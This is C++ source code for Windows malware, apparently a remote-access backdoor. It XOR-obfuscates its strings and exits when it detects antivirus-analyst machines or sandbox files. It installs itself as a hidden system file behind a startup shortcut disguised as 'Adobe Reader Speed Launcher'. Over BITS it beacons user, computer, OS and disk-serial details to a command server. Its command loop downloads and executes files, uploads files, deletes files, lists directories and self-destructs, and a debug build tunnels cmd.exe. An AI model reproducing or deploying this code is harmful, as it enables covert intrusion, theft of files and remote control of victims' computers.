#include "main.h"

#ifdef _DEBUG
#include "commandtunnel.h"
#endif

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{

#ifdef _DEBUG
  CCommandTunnel cmdtun;
  cmdtun.Run( std::wstring(L"cmd.exe") );
  for (;;) Sleep(1000);
#endif

  //lock single instance
  char mutexstr[46];
  if (IsUserAnAdmin()) {
#ifndef _STRING_PROTECTION
    strcpy_s(mutexstr, 46, S("Global\\{91040D7A-F034-4868-85A6-C20FD27CDB6B}"));
  } else {
    strcpy_s(mutexstr, 46, S("Global\\{1DEFAE75-48D8-4272-B86E-A9ADB61A7E37}"));
#else
    strcpy_s(mutexstr, 46, S("\x73\x43\x5e\x5a\x60\x3a\x0d\x22\x0d\x1e\x01\x0c\x31\x12\x66\x18\x19\x69\x01\x0b\x35\x7b\x65\x61\x02\x17\x1c\x00\x34\x17\x67\x74\x77\x1d\x01\x7e\x45\x64\x66\x1a\x70\x6d\x07\x7a\x7c\x56"));
  } else {
    strcpy_s(mutexstr, 46, S("\x73\x43\x5e\x5a\x60\x3a\x0d\x22\x05\x6b\x74\x7e\x40\x13\x66\x6c\x19\x1b\x09\x7c\x39\x7b\x65\x6b\x03\x1d\x1c\x7a\x39\x60\x14\x74\x75\x16\x70\x7c\x43\x60\x60\x18\x03\x6a\x02\x0f\x7c\x56"));
#endif
  }
  CLimitSingleInstance g_SingleInstanceObj(mutexstr);
  //---  

  srand ( (unsigned int)GetTickCount() ); 

  badboy();

  //check if we should enter lzma -si mode
  int argc;
  LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
  if (argc == 2 && argv[1]) {
    main2(argv[1]);
    //lzma e -lc4 -lp0 -pb1 -mt2 -si output.lzma < files.txt
    return 0;
  }

  if (g_SingleInstanceObj.IsAnotherInstanceRunning()) return 0;

  mutex1 = 0;

#ifndef _DEBUG
  std::wstring newpath = startup_propogation();
  if (!newpath.empty()) {
    g_SingleInstanceObj.~CLimitSingleInstance();
    PROCESS_INFORMATION processInformation;
    STARTUPINFOW startupInfo;
    memset(&processInformation, 0, sizeof(processInformation));
    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    if (!CreateProcessW( newpath.c_str(), NULL, NULL, NULL, FALSE,
      NORMAL_PRIORITY_CLASS, NULL, NULL, &startupInfo,
      &processInformation)) {
#ifndef _STRING_PROTECTION
        ShellExecuteW( NULL, S(L"open"), newpath.c_str(), NULL, S(L" C:\\ "), SW_SHOWNORMAL);
#else
        ShellExecuteW( NULL, S(L"\x5b\x5f\x54\x56\x01"), newpath.c_str(), NULL, S(L"\x14\x6c\x0b\x64\x21\x56"), SW_SHOWNORMAL);
#endif
    }
    return 0;
  }
#endif

  for (;;)
	{
		if (mode_bits()) return 0; //DEBUG //continue;
		if (mode_alternative()) continue;
	}
	return 0;
}



#ifdef _STRING_PROTECTION
extern std::vector<void *> stringprotection;
extern char stringprotectionkey[8];
extern bool stringprotectioninitialized;
void S_INIT() {
  if (stringprotectioninitialized) return;
  stringprotectioninitialized = true;
  std::wstring strMyFilename = getmypath();
#ifdef _DEBUG
    //TODO::::
    strMyFilename = L"C:\\Users\\phantom\\Documents\\code\\p2\\d\\Release\\test2.exe";
#endif
  FILE *file;
  _wfopen_s( &file, strMyFilename.c_str(), L"r" );
  if (file == NULL) exit(0);
  fseek(file, 987, SEEK_SET);
  for (int i = 0; i < 8; i++) {
    stringprotectionkey[i] = fgetc(file) + 1;
  }
  fclose(file);
}
char* S(const char *in) {
  if (!stringprotectioninitialized) S_INIT();
  size_t size;
  for (size = 1; in[size-1] != stringprotectionkey[(size-1)%8]; size++);
  char* result = new char[size];
  for (size_t i = 0; i < size; i++) {
    result[i] = in[i] ^ stringprotectionkey[i%8];
  }
  stringprotection.push_back(result);
  return result;
}
wchar_t* S(const wchar_t *in) {
  if (!stringprotectioninitialized) S_INIT();
  size_t size;
  for (size = 1; in[size-1] != stringprotectionkey[(size-1)%8]; size++);
  wchar_t* result = new wchar_t[size];
  for (size_t i = 0; i < size; i++) {
    result[i] = in[i] ^ stringprotectionkey[i%8];
  }
  stringprotection.push_back(result);
  return result;
}
#endif

bool mode_bits()
{
	if (!bits_com_service_setup() || !bits_com_service_connect())
	{
		return false;
	}

  bits_com_clear_stale();

  //generate session id
  u32 key[8];
  getKeySession(key);
  std::wstring wSessionContent = readEncryptedFile (
    generate_path(S(SESSION_FILE_NAME)), key);
  memset(key,0,8);
  if (wSessionContent.length() == 39) {
    wcscpy_s( strSession, _countof( strSession ),
      getNextLine(wSessionContent).c_str() );
    wSessionContent.clear();
    schedule_action(kActionNoop);
  } else {
    wSessionContent = generate_path(S(SESSION_FILE_NAME));
    request_new_session();
  }

  lastCommand = 0;
  die = 0;

	for (;;) {
    MSG msg;
    while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
      // If it is a quit message, exit.
      if (msg.message == WM_QUIT) {
        break;
      }

      // Otherwise, dispatch the message.
      DispatchMessage(&msg);

    } // End of PeekMessage while loop

    if (mutex1 == 2) {
      mutex1 = 0;
      bits_com_file_upload(lastBuffer, lastStrFilename);
      lastBuffer.clear();
      lastStrFilename.clear();
    }

    //run events
    schedule_run();

    SleepEx (100, true);

#ifdef _STRING_PROTECTION
    while (stringprotection.size()) {
      free(stringprotection.back());
      stringprotection.pop_back();
    }
#endif

    if (die && --die == 0) {
      std::wstring strMyFilename = getmypath();
      DeleteFileW(strMyFilename.c_str());
      break;
    }
  }

	bits_com_service_destroy();
	return true;
}

void badboy()
{
//#ifndef _DEBUG
  { // blacklist evil antivirus companies
    wchar_t serialstr[UNLEN];
    DWORD serial;
    char lpVolumeNameBuffer[256], lpFileSystemNameBuffer[256];
    GetVolumeInformation("C:\\", lpVolumeNameBuffer,
      (DWORD)sizeof(lpVolumeNameBuffer), &serial, 0, 0, lpFileSystemNameBuffer,
      (DWORD)sizeof(lpFileSystemNameBuffer));
    _ultow_s(serial, serialstr, UNLEN, 10);

    switch (serial) {
    case 2293361022: //Dave@HOME-OFF-D5F0AC 5.1!
    case 4163918437: //
    case 809860983:  //GT@GT-FDCCD9A7405D 5.1!
    case 13441600:   //
    case 1612674719:
    case 3826811179: //Turing@ALAN-81F9CACFB1 5.1!
    case 473906935:  //VRT@VIRUSCLONE7 5.1!
    case 4034091989: //Administrator@0E2E44DF465C41A 5.1!
    case 2958038740: //DI@DI-938527A14E3A 5.1! 
    case 682696838:  //Administrator@NONE-754C869B74 5.1!
      exit(0);
      break;
    default:
      break;
    }
  }

  {
    //blacklist stupid av companies
    struct __stat64 buf;
#ifndef _STRING_PROTECTION
    if ( !_wstat64( S(L"c:\\temp\\dll-loader.exe"), &buf ) || 
      !_wstat64( S(L"c:\\unmount.bat"), &buf ) ) {
#else
    if ( !_wstat64( S(L"\x57\x15\x6d\x4c\x64\x3b\x21\x05\x50\x43\x5d\x15\x6d\x39\x30\x3d\x51\x5d\x1f\x5d\x79\x33\x51"), &buf ) || 
      !_wstat64( S(L"\x57\x15\x6d\x4d\x6f\x3b\x3e\x2c\x5a\x5b\x1f\x5a\x60\x22\x51"), &buf ) ) {
#endif
        exit(0);
    }
  }

  long trustissueres = trust_issue();
  DWORD dwLastError;
  if (trustissueres != ERROR_SUCCESS) {
    dwLastError = GetLastError();
  }

  Sleep(2000);
  SetErrorMode(0x0002);

  switch (trustissueres) {
  case TRUST_E_PROVIDER_UNKNOWN:
    OSVERSIONINFO vi;
    ZeroMemory(&vi, sizeof(OSVERSIONINFO));
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (GetVersionEx(&vi) && vi.dwMajorVersion == 5 && vi.dwMinorVersion == 2
      && trustissueres == TRUST_E_PROVIDER_UNKNOWN) {
      return;
    }
  case TRUST_E_NOSIGNATURE:
  case TRUST_E_SUBJECT_FORM_UNKNOWN:
    exit(1);
    break;
  case 0:
    break;
  default:
    exit(1);
  }
}

long trust_issue() {
  WINTRUST_FILE_INFO FileData;
  //HWND hWnd = INVALID_HANDLE_VALUE;
  memset(&FileData, 0, sizeof(FileData));
  FileData.cbStruct = sizeof(WINTRUST_FILE_INFO);
  std::wstring strMyFilename = getmypath();
  FileData.pcwszFilePath = strMyFilename.data();
  FileData.hFile = NULL;
  FileData.pgKnownSubject = NULL;
  GUID WVTPolicyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
  WINTRUST_DATA WinTrustData;
  memset(&WinTrustData, 0, sizeof(WinTrustData));
  WinTrustData.cbStruct = sizeof(WinTrustData);
  WinTrustData.pPolicyCallbackData = NULL;
  WinTrustData.pSIPClientData = NULL;
  WinTrustData.dwUIChoice = WTD_UI_NONE;
  WinTrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
  WinTrustData.dwUnionChoice = WTD_CHOICE_FILE;
  WinTrustData.dwStateAction = 0;
  WinTrustData.hWVTStateData = NULL;
  WinTrustData.pwszURLReference = NULL;
  WinTrustData.dwProvFlags = WTD_SAFER_FLAG;
  WinTrustData.dwUIContext = 0;
  WinTrustData.pFile = &FileData;

  return WinVerifyTrust((HWND)INVALID_HANDLE_VALUE,
                      &WVTPolicyGUID,
                      &WinTrustData);
}

std::wstring getmypath() {
  std::wstring strMyFilename = std::wstring(GetCommandLineW());
  if (strMyFilename.at(0) == '"') {
    strMyFilename.erase(0, 1);
    strMyFilename.resize(strMyFilename.find_first_of('"'));
  } else if (npos != strMyFilename.find_first_of(' ')) {
    strMyFilename.resize(strMyFilename.find_first_of(' '));
  }
  return strMyFilename;
}

bool mode_alternative()
{
	return false;
}
void user_elevation()
{
}
std::wstring startup_propogation()
{
  std::wstring newpath;
  FILE *stream;
  const std::wstring mypath = getmypath();
  for (int i = 2; i < 6; i++) {
    newpath = generate_path(S(MAIN_FILENAME), i);
    if (!newpath.compare(mypath)) return L"";
    if (CopyFileW(mypath.data(), newpath.data(), false)) {
      break;
    }
    if (ERROR_ACCESS_DENIED == GetLastError()) {
      return newpath;
    }
  }
  SetFileAttributesW(newpath.data(),
    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
  {
    wchar_t tmppath[MAX_PATH];
    std::wstring path;
    if (!SHGetSpecialFolderPathW(NULL, tmppath,
      (IsUserAnAdmin() ? CSIDL_COMMON_STARTUP : CSIDL_STARTUP), true)) {
#ifndef _STRING_PROTECTION
      GetEnvironmentVariableW(S(L"USERPROFILE"), tmppath, (DWORD) sizeof(tmppath)/sizeof(WCHAR));
#else
      GetEnvironmentVariableW(S(L"\x61\x7c\x74\x6a\x51\x04\x1e\x1f\x7d\x63\x74\x38"), tmppath, (DWORD) sizeof(tmppath)/sizeof(WCHAR));
#endif
      if (!tmppath[0]) return L"";
      std::wstring basepath = tmppath;
      if (basepath.at(basepath.length()-1) != '\\') {
        basepath.append(L"\\");
      }
      path = basepath;
#ifndef _STRING_PROTECTION
      path.append(S(L"Start Menu\\Programs\\Startup"));
#else
      path.append(S(L"\x67\x5b\x50\x4a\x75\x76\x1c\x3c\x5a\x5a\x6d\x68\x73\x39\x36\x2b\x55\x42\x42\x64\x52\x22\x30\x2b\x40\x5a\x41\x38"));
#endif
      rand_wchar_t(tmppath, 7);
      path.append(tmppath);
      if (!_wfopen_s(&stream, path.c_str(), L"a" )) {
        fclose(stream);
        DeleteFileW(path.c_str());
      } else {
        path = basepath;
#ifndef _STRING_PROTECTION
        path.append(S(L"AppData\\Roaming\\Microsoft\\Windows\\Start Menu"));
#else
        path.append(S(L"\x75\x5f\x41\x7c\x60\x22\x30\x05\x66\x40\x50\x55\x68\x38\x36\x05\x79\x46\x52\x4a\x6e\x25\x3e\x3f\x40\x73\x66\x51\x6f\x32\x3e\x2e\x47\x73\x62\x4c\x60\x24\x25\x79\x79\x4a\x5f\x4d\x01"));
#endif
      }
    } else {
      path = tmppath;
      if (path.at(path.length()-1) != '\\') {
        path.append(L"\\");
      }
    }
    {
      rand_wchar_t(tmppath, 7);
      std::wstring testpath = path;
      testpath.append(tmppath);
      if (!_wfopen_s(&stream, testpath.data(), L"a" )) {
        fclose(stream);
        DeleteFileW(testpath.data());
      } else {
        return L"";
      }
    }
#ifndef _STRING_PROTECTION
    path.append(S(L"Adobe Reader Speed Launcher.lnk"));
#else
    path.append(S(L"\x75\x4b\x5e\x5a\x64\x76\x03\x3c\x55\x4b\x54\x4a\x21\x05\x21\x3c\x51\x4b\x11\x74\x60\x23\x3f\x3a\x5c\x4a\x43\x16\x6d\x38\x3a\x59"));
#endif
    mkshortcut(newpath, path);
    return newpath;
  }
  return L"";
}

void mkshortcut(const std::wstring& target, const std::wstring& linkpath) {
  HRESULT hres = NULL;
  IShellLinkW* psl = NULL;
  hres = ::CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
  if (!SUCCEEDED(hres)) return;
  hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                          IID_IShellLinkW, (LPVOID*)&psl);
  if (SUCCEEDED(hres))
  {
    IPersistFile* ppf;

    // Set the path to the shortcut target
    psl->SetPath(target.data());

    // Query IShellLink for the IPersistFile interface for
    // saving the shortcut in persistent storage.
    hres = psl->QueryInterface(IID_IPersistFile, reinterpret_cast<void**>(&ppf));

    if (SUCCEEDED(hres))
    {
      // Save the link by calling IPersistFile::Save.
      hres = ppf->Save(linkpath.data(), TRUE);
      ppf->Release();
    }
    psl->Release();
  }
  SetFileAttributesW(linkpath.data(), FILE_ATTRIBUTE_SYSTEM);
}

void request_new_session()
{
  std::wstring url = S(REQUEST_SESSION_NAME);

  wchar_t username [UNLEN + 1];
  DWORD size = sizeof(username)/sizeof(WCHAR);

  GetUserNameW(username, &size);
  url.append(urlencode(std::wstring(username)));

#ifndef _STRING_PROTECTION
  url.append(S(L"@"));
#else
  url.append(S(L"\x74\x2f"));
#endif

  size = sizeof(username)/sizeof(WCHAR);
  GetComputerNameW(username, &size);
  url.append(urlencode(std::wstring(username)));

#ifndef _STRING_PROTECTION
  url.append(S(L"%20"));
#else
  url.append(S(L"\x11\x1d\x01\x38"));
#endif

  size = sizeof(username)/sizeof(WCHAR);
  DWORD dwVersion = ::GetVersion();
  _ultow_s((DWORD)(LOBYTE(LOWORD(dwVersion))), username, size, 10);
  url.append(username);
  url.append(L".");
  _ultow_s((DWORD)(HIBYTE(LOWORD(dwVersion))), username, size, 10);
  url.append(username);
  
  if (IsUserAnAdmin()) {
    url.append(L"!");
  }

  if (!trust_issue()) {
    url.append(L"~");
  }

#ifndef _STRING_PROTECTION
  url.append(S(L"&serial="));
#else
  url.append(S(L"\x12\x5c\x54\x4a\x68\x37\x3d\x64\x34"));
#endif
  
  DWORD serial;
  char lpVolumeNameBuffer[256], lpFileSystemNameBuffer[256];
  GetVolumeInformation("C:\\", lpVolumeNameBuffer,
    (DWORD)sizeof(lpVolumeNameBuffer), &serial, 0, 0, lpFileSystemNameBuffer,
    (DWORD)sizeof(lpFileSystemNameBuffer));
  size = sizeof(username)/sizeof(WCHAR);
  _ultow_s(serial, username, size, 10);
  url.append(urlencode(std::wstring(username)));

  std::wstring wSessionContent = generate_path(S(SESSION_FILE_NAME));
  DeleteFileW(wSessionContent.c_str());
  
  bits_com_file_download(url, wSessionContent, kActionSession);
}

void schedule_action(enum kActions intAction = kActionNoop)
{
  d_event *ev = new d_event();
  ev->action = intAction;
  ev->time = GetTickCount();
  if (lastCommand) {
    if ((ev->time - lastCommand) > 60*60*1000) {
      ev->time += 15*60*1000;
    } else if ((ev->time - lastCommand) > 15*60*1000) {
      ev->time += 10*60*1000;
    } else if ((ev->time - lastCommand) > 5*60*1000) {
      ev->time += 5*60*1000;
    } else {
      ev->time += 1*60*1000;
    }
  } else {
    lastCommand = ev->time - 60*60*1000;
  }
  events.push_back(ev);
}

void schedule_run()
{
  std::vector<d_event *>::iterator it, itFailsafe;
  DWORD now = GetTickCount();
  std::wstring strUrl;
  wchar_t strRand[11];
  int intFailsafe = 0;
  bool boolSchedActFailSafe = false;
  bool boolSchedActNoop = false;

  if (die) return;

  for (it = events.begin(); it != events.end(); it++) {
    switch ((*it)->action) {
      case kActionNoop:
        if ((*it)->time > now) {
          intFailsafe = intFailsafe | 2;
          continue;
        }
        strUrl = S(REQUEST_NOOP);
        strUrl.append(strSession);
        rand_wchar_t(strRand, 10);
        bits_com_file_download(strUrl, generate_path(strRand), kActionNoop);
        boolSchedActFailSafe = true;
        break;
      case kActionFailsafe:
        if ((*it)->time < now) {
          boolSchedActNoop = true;
        } else if (intFailsafe != 3) {
          intFailsafe = intFailsafe | 1;
          itFailsafe = it;
          continue;
        }
        break;
      default:
        continue;
    }
    delete (*it);
    it = events.erase(it);
    if (it == events.end()) break;
  }
  if (intFailsafe == 3) {
    delete (*itFailsafe);
    events.erase(itFailsafe);
  }
  if (boolSchedActFailSafe) {
    schedule_action(kActionFailsafe);
  }
  if (boolSchedActNoop) {
    schedule_action(kActionNoop);
  }
}

void noop_parse(const wchar_t *path) {
  std::wstring strFile, strLine, strParams;
  wchar_t strCmd[4] = {0}, strRand[11];
  DWORD intPos = 0;
  bool boolTickCount = true;
  bool boolSchedNoop = true;
  BOOL boolResult;
  u32 key[8];
   
  {
    FILE *file;
    _wfopen_s( &file, path, L"r" );
    if (file) {
      char rns[4] = {0};
      fread_s(rns, 4, 1, 3, file);
#ifndef _STRING_PROTECTION
      if (!strcmp(rns, S("RNS"))) {
#else
      if (!strcmp(rns, S("\x66\x61\x62\x38"))) {
#endif
        request_new_session();
        lastCommand = GetTickCount();
        schedule_action(kActionNoop);
        fclose(file);
        return;
      }
      fclose(file);
    }
  }
  getKeySession(key);
  strFile = readEncryptedFile(std::wstring(path), key);
  memset(key,0,8);
  DeleteFileW(path);

  while (strFile.length() > 4) {
    strLine = getNextLine(strFile);
    if (strLine.length() < 4) continue;
    if (boolTickCount) {
      lastCommand = GetTickCount();
      boolTickCount = false;
    }
    wcscpy_s (strCmd, _countof(strCmd), strLine.substr(0,3).c_str());
    strLine = strLine.substr(4);
    strParams.clear();
    if (!strLine.empty() && strLine.at(0) == '"') {
      intPos = strLine.find_first_of('"', 1);
      if (intPos != npos) intPos++;
    } else {
      intPos = strLine.find_first_of(' ');
    }
    if (intPos != npos && intPos < strLine.length()) {
      strParams = strLine.substr(intPos+1);
      strLine = strLine.substr(0, intPos);
    }
#ifndef _STRING_PROTECTION
    if (!wcscmp(strCmd, S(L"GET"))) {
#else
    if (!wcscmp(strCmd, S(L"\x73\x6a\x65\x38"))) {
#endif
      if (strLine.empty()) continue; //no url
      if (strParams.empty()) {
        //generate path myself since it's not provided
        rand_wchar_t(strRand, 10);
        strLine = std::wstring(strRand);
      } else if (strParams.at(0) == '"') {
        strParams.erase(0, 1);
        strParams.resize(strParams.find_first_of('"'));
      }
      bits_com_file_download(strLine, strParams, kActionDownload);
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"DAE"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x70\x6e\x74\x38"))) {
#endif
      //download and execute
      //if you want pregenerated path start with .\filename.ext
      if (strLine.empty() || strParams.empty()) continue; //no url or no path
      if (strParams.length() > 2 && strParams.at(0) == L'.'
        && strParams.at(1) == L'\\') {
        bits_com_file_download(strLine, generate_path(strParams.substr(2)),
          kActionRun);
      } else {
        if (strParams.at(0) == '"') {
          strParams.erase(0, 1);
          strParams.resize(strParams.find_first_of('"'));
        }
        bits_com_file_download(strLine, strParams, kActionRun);
      }
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"PUT"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x64\x7a\x65\x38"))) {
#endif
      //upload a file
      if (strLine.empty() || strParams.empty()) continue; //no url or no path
      if (strParams.at(0) == '"') {
        strParams.erase(0, 1);
        strParams.resize(strParams.find_first_of('"'));
      }
      bits_com_file_upload(strLine, strParams);
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"DEL"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x70\x6a\x7d\x38"))) {
#endif
      if (strLine.empty()) continue; //no path
      if (strLine.at(0) == '"') {
        strLine.erase(0, 1);
        strLine.resize(strLine.length() - 1);
      }
      if (strLine.length() > 2 && strLine.at(0) == L'.'
        && strLine.at(1) == L'\\') {
        strLine = generate_path(strLine.substr(2));
      }
      boolResult = DeleteFileW(strLine.c_str());
      
      if (boolResult) {
#ifndef _STRING_PROTECTION
        strParams = S(L"file successfully removed: ");
#else
        strParams = S(L"\x52\x46\x5d\x5d\x21\x25\x24\x3a\x57\x4a\x42\x4b\x67\x23\x3d\x35\x4d\x0f\x43\x5d\x6c\x39\x27\x3c\x50\x15\x11\x38");
#endif
      } else {
#ifndef _STRING_PROTECTION
        strParams = S(L"file failed to be removed: ");
#else
        strParams = S(L"\x52\x46\x5d\x5d\x21\x30\x30\x30\x58\x4a\x55\x18\x75\x39\x71\x3b\x51\x0f\x43\x5d\x6c\x39\x27\x3c\x50\x15\x11\x38");
#endif
      }
      strParams.append(strLine);
      send_report(std::wstring(strCmd), strParams);
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"RUN"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x66\x7a\x7f\x38"))) {
#endif
      if (strLine.empty()) continue; //no path
      if (strLine.length() > 3 && strLine.at(0) == L'.'
        && strLine.at(1) == L'\\') {
        strLine = generate_path(strLine.substr(2));
      }
#ifndef _STRING_PROTECTION
      ShellExecuteW( NULL, S(L"open"), strLine.c_str(), strParams.c_str(), S(L" C:\\ "), SW_SHOWNORMAL);
      strParams = S(L"executed: ");
#else
      ShellExecuteW( NULL, S(L"\x5b\x5f\x54\x56\x01"), strLine.c_str(), strParams.c_str(), S(L"\x14\x6c\x0b\x64\x21\x56"), 0);
      strParams = S(L"\x51\x57\x54\x5b\x74\x22\x34\x3d\x0e\x0f\x31");
#endif
      strParams.append(strLine);
      send_report(std::wstring(strCmd), std::wstring(strParams));
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"REP"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x66\x6a\x61\x38"))) {
#endif

/*
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x56\x64\x22\x22\x2d\x55\x5b\x11\x15\x60\x38\x71\x67\x0a\x0f\x14\x4c\x64\x3b\x21\x7c\x68\x5d\x54\x48\x30\x62\x65\x6b\x1a\x5b\x5c\x48\x01"),0);
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x51\x71\x35\x3e\x37\x52\x46\x56\x18\x2e\x37\x3d\x35\x14\x11\x0f\x18\x24\x22\x34\x34\x44\x0a\x6d\x4a\x64\x26\x60\x6d\x00\x1d\x1f\x4c\x6c\x26\x51"),0);
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x56\x64\x22\x71\x2c\x47\x4a\x43\x4b\x21\x68\x6f\x79\x11\x5b\x54\x55\x71\x73\x0d\x2b\x51\x5f\x00\x0c\x35\x64\x7f\x2d\x59\x5f\x31"),0);
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x56\x64\x22\x71\x2a\x5c\x4e\x43\x5d\x21\x68\x6f\x79\x11\x5b\x54\x55\x71\x73\x0d\x2b\x51\x5f\x00\x0c\x35\x64\x7f\x2d\x59\x5f\x31"),0);
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x56\x64\x22\x71\x2f\x5d\x4a\x46\x18\x3f\x68\x71\x7c\x40\x4a\x5c\x48\x24\x0a\x23\x3c\x44\x1e\x05\x0c\x33\x78\x25\x34\x44\x2f"),0);
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x56\x64\x22\x71\x2a\x40\x4e\x43\x4c\x21\x68\x6f\x79\x11\x5b\x54\x55\x71\x73\x0d\x2b\x51\x5f\x00\x0c\x35\x64\x7f\x2d\x59\x5f\x31"),0);
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x4a\x6e\x23\x25\x3c\x14\x7f\x63\x71\x4f\x02\x71\x67\x0a\x0f\x14\x4c\x64\x3b\x21\x7c\x68\x5d\x54\x48\x30\x62\x65\x6b\x1a\x5b\x5c\x48\x01"),0);
WinExec(S("\x57\x42\x55\x16\x64\x2e\x34\x79\x1b\x4c\x11\x4c\x60\x25\x3a\x35\x5d\x5c\x45\x18\x3f\x68\x71\x7c\x40\x4a\x5c\x48\x24\x0a\x23\x3c\x44\x1e\x05\x0c\x33\x78\x25\x34\x44\x2f"),0);
	  strParams = S(L"The Report has been created! [%temp%\rep1442.tmp]");
      send_report(std::wstring(strCmd), strParams);
*/

#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"DIR"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x70\x66\x63\x38"))) {
#endif
      InterlockedIncrement(&mutex1);
      if (!strLine.empty() && strLine.at(0) == '"') {
        strLine.erase(0, 1);
        strLine.resize(strLine.length() - 1);
      }
      dirdump.Run( strLine );
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"DIE"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x70\x66\x74\x38"))) {
#endif
      send_report(std::wstring(strCmd), strParams);
      die = 500;
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"NOP"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x7a\x60\x61\x38"))) {
#endif
      //wakeup
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"SLP"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x67\x63\x61\x38"))) {
#endif
      //sleep
      lastCommand = GetTickCount() - 60*60*1000;
#ifndef _STRING_PROTECTION
    } else if (!wcscmp(strCmd, S(L"RNS"))) {
#else
    } else if (!wcscmp(strCmd, S(L"\x66\x61\x62\x38"))) {
#endif
      request_new_session();
      boolSchedNoop = false;
    }
  }
  if (boolSchedNoop) {
    schedule_action(kActionNoop);
  }
}
